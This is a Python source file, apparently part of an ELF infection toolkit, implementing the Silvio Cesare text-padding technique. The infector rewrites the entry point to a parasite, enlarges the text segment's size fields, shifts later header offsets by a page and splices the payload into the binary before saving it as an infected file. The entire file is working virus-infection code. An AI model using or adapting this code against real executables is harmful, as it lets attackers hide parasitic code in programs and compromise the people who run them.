from infections.infector import Infector
from ELF.elf import Elf
from ELF.elf_utils import get_text_phdr

PAGESIZE = 0x200000


class SilvioPaddingInfector(Infector):

	def infect(self, elf_obj, infected_name, payload):
		print('[*] Infecting using silvio padding.\n')
		
		print('[1] Increase p_shoff by PAGE_SIZE.\n\n')
		elf_obj.ehdr['e_shoff'] += PAGESIZE

		text_phdr = get_text_phdr(elf_obj.phdrs)
		original_text_size = text_phdr['p_filesz']
		parasite_vaddr = text_phdr['p_vaddr'] + original_text_size
		
		print('\t[2.1] Change e_entry to parasite.')
		elf_obj.ehdr['e_entry'] = parasite_vaddr

		print('\t[2.2] Increase p_filesz by parasite size.')
		text_phdr['p_filesz'] += len(payload)

		print('\t[2.3] Increase p_memsz by parasite size.\n\n')
		text_phdr['p_memsz'] += len(payload)

		for phdr in elf_obj.phdrs:
			if phdr['p_offset'] > text_phdr['p_offset'] + original_text_size:
				print('\t[3.1] Increase phdr offset by PAGE_SIZE')
				phdr['p_offset'] += PAGESIZE

		for shdr in elf_obj.shdrs:
			if shdr['sh_offset'] > parasite_vaddr:
				print('\t[4.1 Increase shdr offset by PAGE_SIZE]')
				shdr['sh_offset'] += PAGESIZE
			elif shdr['sh_addr'] + shdr['sh_size'] == parasite_vaddr:
				shdr['sh_size'] += len(payload)
		
		new_file_content = elf_obj.file_content[:text_phdr['p_offset'] + original_text_size]
		new_file_content += payload.ljust(PAGESIZE, b'\xcc')
		new_file_content += elf_obj.file_content[text_phdr['p_offset'] + original_text_size:]
		elf_obj.file_content = new_file_content
		elf_obj.save_as(infected_name)